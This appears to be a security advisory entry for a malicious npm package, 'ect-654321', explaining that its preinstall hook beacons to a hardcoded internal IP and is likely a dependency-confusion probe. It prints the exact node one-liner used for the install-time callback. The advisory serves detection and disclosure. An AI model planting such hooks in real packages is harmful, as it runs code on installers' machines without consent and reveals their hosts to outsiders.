summary: preinstall beacon to hardcoded internal IP confirms install-time code execution
details: The package's preinstall lifecycle hook executes `node -e "require('http').get('http://10.107.121.85:8000/callback_node')"`, sending an unconditional outbound HTTP GET to a hardcoded RFC1918 address (10.107.121.85:8000) on every `npm install`. This fires automatically at install time without user consent and reveals the installer's host (source IP, timing, hostname via the TCP connection) to whoever controls that internal endpoint. The package name `ect-654321` combined with this beaconing behavior is consistent with a dependency-confusion probe — a package published to the public registry to confirm code execution on internal build systems that mistakenly resolve a private package name against npmjs.com. The package ships no functional code beyond the beacon.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
